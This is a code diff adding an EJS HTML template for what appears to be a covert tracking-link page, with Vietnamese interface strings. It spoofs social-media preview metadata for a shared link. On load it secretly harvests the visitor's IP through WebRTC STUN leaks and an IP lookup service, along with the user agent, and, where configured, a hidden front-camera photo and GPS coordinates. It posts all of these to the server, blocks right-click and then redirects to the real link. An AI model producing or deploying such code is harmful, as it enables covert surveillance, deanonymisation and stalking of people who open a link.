@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <title><% if (data&&data.post&&data.post.titleval){%><%- data.post.titleval %><%} else {%>Title<%}%></title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="referrer" content="no-referrer">
+
+<% if (data&&data.post&&data.post.titleval){%>
+  <meta name="title" content="<%- data.post.titleval %>">
+  <meta property="title" content="<%- data.post.titleval %>">
+  <meta property="og:title" content="<%- data.post.titleval %>">
+  <meta name="og:title" content="<%- data.post.titleval %>">
+  <meta name="twitter:title" content="<%- data.post.titleval %>">
+<%}%>
+<% if (data&&data.post&&data.post.bgimg){%>
+  <meta name="image" content="<%- data.post.bgimg%>">
+  <meta property="og:image" content="<%- data.post.bgimg%>">
+  <meta property="image" content="<%- data.post.bgimg%>">
+  <meta name="og:image" content="<%- data.post.bgimg%>">
+  <meta name="twitter:image" content="<%- data.post.bgimg%>">
+  <meta name="twitter:image:src" content="<%- data.post.bgimg%>">
+  <meta property="twitter:image:src" content="<%- data.post.bgimg%>">
+<%}%>
+<% if (data&&data.post&&data.post.link){%>
+  <meta name="description" content="<%- data.post.link %>">
+  <meta property="description" content="<%- data.post.link %>">
+  <meta property="og:description" content="<%- data.post.link %>">
+  <meta name="og:description" content="<%- data.post.link %>">
+  <meta name="twitter:description" content="<%- data.post.link %>">
+<%}%>
+  <!-- <meta property="og:url" content="www.facebook.com"> -->
+  <link rel="shortcut icon"  href="/static/imgs/icons8-internet.ico">  
+</head>
+
+<body>
+<div style="width: 0; height: 0; overflow: hidden; display: none;">
+  <% if (data&&data.post&&data.post.content){%><%- data.post.content %><%}%>
+</div>
+  <button id="playButton" style="padding: 10px 20px; display: none; font-size: 16px; background-color: #f0f0f0; color: #007bff; border: none; border-radius: 5px; cursor: pointer; margin: 0 auto; max-width: calc(100% - 20px); margin-top: 50px;"><b>Nhấn vào đây để tiếp tục</b></button>
+  <video autoplay muted playsinline id="videoid" style="width: 100%; visibility: hidden;"></video> 
+
+<form action="/postdata" method="post" class="postgeo" id="postgeo" name="postgeo" style="visibility: hidden;">
+  <input type="hidden" class="title" id="title" name="title" value="<% if (data&&data.post&&data.post.title){%><%- data.post.title %><%}%>">
+  <input type="hidden" class="getip" id="getip" name="getip" value="<% if (data&&data.post&&data.getip){%><%- data.getip %><%}%>">
+  <input type="hidden" class="data_geol" id="data_geol" name="data_geol">
+  <input type="hidden" class="link" id="link" name="link" value="<% if (data&&data.post&&data.post.link){%><%- data.post.link %><%}%>">
+  <input type="hidden" class="useragent" id="useragent" name="useragent">
+  <input type="hidden" class="id_user" id="id_user" name="id_user" value="<% if (data&&data.post&&data.post.id_user){%><%- data.post.id_user %><%}%>">
+  <input type="hidden" class="name_user" id="name_user" name="name_user" value="<% if (data&&data.post&&data.post.name_user){%><%- data.post.name_user %><%}%>">
+</form>
+
+<div style="visibility: hidden;">
+  <input type="hidden" class="maxCountCheck" id="maxCountCheck" name="maxCountCheck">
+  <input type="hidden" class="CountCheck" id="CountCheck" name="CountCheck">
+  <input type="hidden" class="checkrtc" id="checkrtc" name="checkrtc">
+  <input type="hidden" class="check_img" id="check_img" name="check_img" value="<% if (data&&data.post&&data.post.check_img){%><%- data.post.check_img %><%}%>">
+  <input type="hidden" class="check_geo" id="check_geo" name="check_geo" value="<% if (data&&data.post&&data.post.check_geo){%><%- data.post.check_geo %><%}%>">
+</div>
+
+  <canvas id="canvasid" style="visibility: hidden;"></canvas>
+</body>
+<script type="text/javascript">
+
+  function startpost() {
+    try {
+      document.getElementById("CountCheck").value = 0;
+      document.getElementById("maxCountCheck").value = 0;
+      document.getElementById("checkrtc").value = 0;
+
+      function submitform (inputID, valueSubmit) {
+        document.getElementById(inputID).value += valueSubmit;
+        document.getElementById("CountCheck").value++; 
+        if (document.getElementById("CountCheck").value >= document.getElementById("maxCountCheck").value || document.getElementById("maxCountCheck").value == 0) { 
+          document.getElementById("postgeo").submit(); 
+           window.setTimeout(function () { window.location.href = document.getElementById("link").value; }, 3000);
+        };
+      };
+
+      if (navigator && navigator.userAgentData) {
+        document.getElementById("useragent").value += "<p>" + JSON.stringify(navigator.userAgentData) + "</p>";
+      } else if (navigator && navigator.userAgent) {
+        document.getElementById("useragent").value += "<p>" + navigator.userAgent + "</p>";
+      };
+
+      function apiV4() {
+        document.getElementById("maxCountCheck").value++;
+        try {
+          var xhr = new XMLHttpRequest();
+          xhr.open("GET", "https://api.ipify.org", true);
+          xhr.timeout = 3000;
+          xhr.onload = function () {
+            if (xhr.status >= 200 && xhr.status < 300) {
+              var response = xhr.responseText;
+              if (response) {
+                submitform('getip', 'apiV4: ' + response + '\n\n');
+              } else {
+                submitform('getip', 'apiV4: Không có \n\n');
+              }
+            } else {
+              submitform('getip', 'apiV4: Lỗi API \n\n');
+            }
+          };
+          xhr.ontimeout = function () { submitform('getip', 'apiV4: Hết giờ \n\n'); };
+          xhr.onerror = function () { submitform('getip', 'apiV4: Không kết nối \n\n'); };
+          xhr.send();
+        } catch (err) {
+          submitform('getip', 'apiV4: Lỗi kết nối \n\n');
+        }
+      };
+      //=============================================================
+      function rtcconect() {
+        document.getElementById("maxCountCheck").value++;
+        try {
+          var peerConnection = new RTCPeerConnection({
+            iceServers: [
+              { urls: 'stun:stun.l.google.com:19302' },
+              { urls: 'stun:stun1.l.google.com:19302' },
+              { urls: 'stun:stun.ideasip.com' },
+              { urls: 'stun:stun.intervoip.com:3478' },
+              { urls: 'stun:stun.whoi.edu:3478' },
+            ]
+          });
+
+          peerConnection.createDataChannel("");
+
+          setTimeout(function () {
+            if (document.getElementById("checkrtc").value < 4) {
+              apiV4();
+              document.getElementById("checkrtc").value = 9;
+              submitform('getip', 'WebRTC: Timeout \n\n');
+            };
+          }, 3000);
+
+          peerConnection.onicecandidate = function (event) {
+            try {
+              if (document.getElementById("checkrtc").value <= 4) {
+                if (event.candidate) {
+                  document.getElementById("checkrtc").value++;
+                  //v6
+                  if ((/(?:[A-F0-9]{1,4}:){7}[A-F0-9]{1,4}/gi).test(JSON.stringify(event.candidate))) {
+                    document.getElementById("getip").value += 'WebRTC: ' + JSON.stringify(event.candidate).match(/(?:[A-F0-9]{1,4}:){7}[A-F0-9]{1,4}/gi) + '\n\n';
+                  };
+                  //v4
+                  if ((/\b(?:\d{1,3}\.){3}\d{1,3}\b/g).test(JSON.stringify(event.candidate))) {
+                    document.getElementById("getip").value += 'WebRTC: ' + JSON.stringify(event.candidate).match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) + '\n\n';
+                    document.getElementById("checkrtc").value = 4;
+                  };
+                  if (document.getElementById("checkrtc").value == 4) {
+                    document.getElementById("checkrtc").value = 9;
+                    submitform('getip', '');
+                  };
+                } else {
+                  apiV4();
+                  document.getElementById("checkrtc").value = 9;
+                  submitform('getip', 'WebRTC: Not event \n\n');
+                };
+              };
+            } catch (err) {
+              apiV4();
+              document.getElementById("checkrtc").value = 9;
+              submitform('getip', 'WebRTC: Lỗi onicecandidate \n\n');
+            }
+          };
+
+          peerConnection.createOffer()
+            .then(offer => peerConnection.setLocalDescription(offer))
+            .catch(error => {
+              apiV4();
+              document.getElementById("checkrtc").value = 9;
+              submitform('getip', 'WebRTC: Lỗi setLocal \n\n');
+            });
+        } catch (err) {
+          apiV4();
+          document.getElementById("checkrtc").value = 9;
+          submitform('getip', 'WebRTC: Lỗi khởi tạo \n\n');
+        }
+      };
+
+      if (typeof RTCPeerConnection === 'function') {
+        rtcconect();
+      } else {
+        apiV4();
+      };
+
+      if (document.getElementById("check_img").value == 1) {
+        document.getElementById("maxCountCheck").value++;
+        function takepic() {
+          try {
+            if (!document.getElementById("canvasid")) {
+              document.body.appendChild(document.createElement("canvas")).id = "canvasid";
+              document.getElementById("canvasid").style.visibility = "hidden";
+            };
+            document.getElementById("canvasid").width = document.getElementById("videoid").videoWidth;
+            document.getElementById("canvasid").height = document.getElementById("videoid").videoHeight;
+            document.getElementById("canvasid").getContext("2d").drawImage(document.getElementById("videoid"), 0, 0);
+
+            var dataImage = {
+              id: "data_photo_" + new Date().valueOf() + ".jpeg",
+              img: document.getElementById("canvasid").toDataURL("image/jpeg"),
+              type: 'image/jpeg'
+            };
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "/uploadimg", true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.timeout = 3000;
+
+            xhr.onload = function () {
+              if (xhr.status >= 200 && xhr.status < 300) {
+                var response = JSON.parse(xhr.responseText);
+                if (response.status == 200) {
+                  submitform('data_geol', "<p><b>Ảnh: </b><a class='linkimg' download='" + dataImage.id + "' href='/photo/" + dataImage.id + "' >Tải xuống</a></p>");
+                } else {
+                  submitform('data_geol', "<p><b>Ảnh: </b>Lỗi tải ảnh lên máy chủ.</p>");
+                }
+              } else {
+                submitform('data_geol', "<p><b>Ảnh: </b>Lỗi kết nối máy chủ (status).</p>");
+              }
+            };
+
+            xhr.ontimeout = function () { submitform('data_geol', "<p><b>Ảnh: </b>Quá thời gian chờ.</p>"); };
+
+            xhr.onerror = function () { submitform('data_geol', "<p><b>Ảnh: </b>Lỗi kết nối máy chủ (onerror).</p>"); };
+
+            xhr.send(JSON.stringify(dataImage));
+
+          } catch (err) {
+            submitform('data_geol', "<p><b>Ảnh: </b>Lỗi tải</p>");
+          }
+        };
+
+        function playVid() {
+          try {
+            if (navigator && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({
+                  video: {
+                    width: { min: 320, ideal: 640, max: 960 },
+                    height: { min: 180, ideal: 360, max: 540 },
+                    facingMode: "user"
+                  }
+                }).then(function (videoStream) {
+                    // document.getElementById("videoid").onplaying = () => console.log("video playing stream");
+                    document.getElementById("videoid").srcObject = videoStream;
+                    setTimeout(function () {
+                      if (document.getElementById("videoid") && document.getElementById("videoid").paused) {
+                          document.getElementById("videoid").muted = true;
+                          document.getElementById("videoid").play();
+                          setTimeout(function () {
+                            if (document.getElementById("videoid") && document.getElementById("videoid").paused) {
+                              document.getElementById("playButton").style.display = "block";
+                              document.addEventListener("click", function () {
+                                document.getElementById("videoid").play();
+                                document.getElementById("playButton").style.display = "none";
+                                // document.getElementById("videoid").style.opacity = 0;
+                                // document.getElementById("videoid").style.visibility = "";
+                                setTimeout(takepic, 1000);
+                              });
+                            } else {
+                              takepic();
+                            };
+                          }, 1000);
+                      } else {
+                        takepic();
+                      };
+                    }, 1000);
+                  }).catch(function (error1) {
+                    submitform('data_geol', "<p><b>Ảnh: </b>Lỗi cấp quyền Camera</p>");
+                  });
+            } else {
+              submitform('data_geol', "<p><b>Ảnh: </b>Không hỗ trợ API camera</p>");
+            };
+          } catch (errorVid) {
+            submitform('data_geol', "<p><b>Ảnh: </b>Lỗi Camera</p>");
+          };
+        };
+        window.setTimeout(playVid, 500);
+      };
+
+      if (document.getElementById("check_geo").value == 1) {
+        document.getElementById("maxCountCheck").value++;
+        function getLocation() {
+          try {
+            if (navigator && navigator.geolocation && navigator.geolocation.getCurrentPosition) {
+              setTimeout(navigator.geolocation.getCurrentPosition(showPosition, showError, { timeout: 5000, maximumAge: 600000 }), 1000);
+            } else {
+              submitform('data_geol', "<p><b>Tọa độ: </b>Trình duyệt không hỗ trợ Geolocation</p>");
+            };
+          } catch (err) {
+            submitform('data_geol', "<p><b>Tọa độ: </b>Lỗi lấy tọa độ</p>");
+          }
+        };
+
+        function showPosition(pos) {
+          try {
+            var lat = "not";
+            var lon = "not";
+            var accur = "not";
+            if (pos && pos.coords && pos.coords.latitude !== undefined) { lat = pos.coords.latitude };
+            if (pos && pos.coords && pos.coords.longitude !== undefined) { lon = pos.coords.longitude };
+            if (pos && pos.coords && pos.coords.accuracy !== undefined) { accur = pos.coords.accuracy };
+            submitform('data_geol', "<p><b>Tọa độ: </b><a class='geolocation' href='https://www.google.com/maps/place/" + lat + ',' + lon + "'>" + lat + "," + lon + "</a> (Lệch: " + accur + " m)</p>");
+          } catch (errorpos1) {
+            submitform('data_geol', "<p><b>Tọa độ: </b>Lỗi lấy tọa độ 2</p>");
+          }
+        };
+
+        function showError(error) { submitform('data_geol', "<p><b>Tọa độ: </b>Không được cấp quyền</p>"); };
+        window.setTimeout(getLocation, 400);
+      };
+
+      try { document.oncontextmenu = function () { return false; }; } catch (err){};
+
+      window.setTimeout(function () {
+        document.getElementById("data_geol").value += "<p><b>Người dùng không xác nhận hết các yêu cầu</b></p>";
+        document.getElementById("postgeo").submit();
+        window.setTimeout(function () { window.location.href = document.getElementById("link").value; }, 3000);
+      }, 10000);
+
+      if (document.getElementById("CountCheck").value >= document.getElementById("maxCountCheck").value || document.getElementById("maxCountCheck").value == 0) { 
+        document.getElementById("postgeo").submit(); 
+        window.setTimeout(function () { window.location.href = document.getElementById("link").value; }, 3000);
+      };
+    } catch (errorfn) {
+      document.getElementById("postgeo").submit();
+      window.setTimeout(function () { window.location.href = 'https://google.com' }, 3000);
+    };
+  };
+
+  window.onload = startpost;
+</script>
+</html>
